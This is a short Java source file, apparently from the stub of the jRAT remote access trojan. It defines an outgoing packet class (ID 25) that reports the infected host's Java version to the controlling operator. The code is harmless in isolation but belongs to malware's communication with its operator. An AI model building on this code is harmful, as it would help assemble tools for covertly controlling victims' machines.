package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet25InitJavaVersion extends AbstractOutgoingPacket {

	private String version;
	
	public Packet25InitJavaVersion(String version) {
		this.version = version;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(version);
	}

	@Override
	public byte getPacketId() {
		return (byte) 25;
	}

}
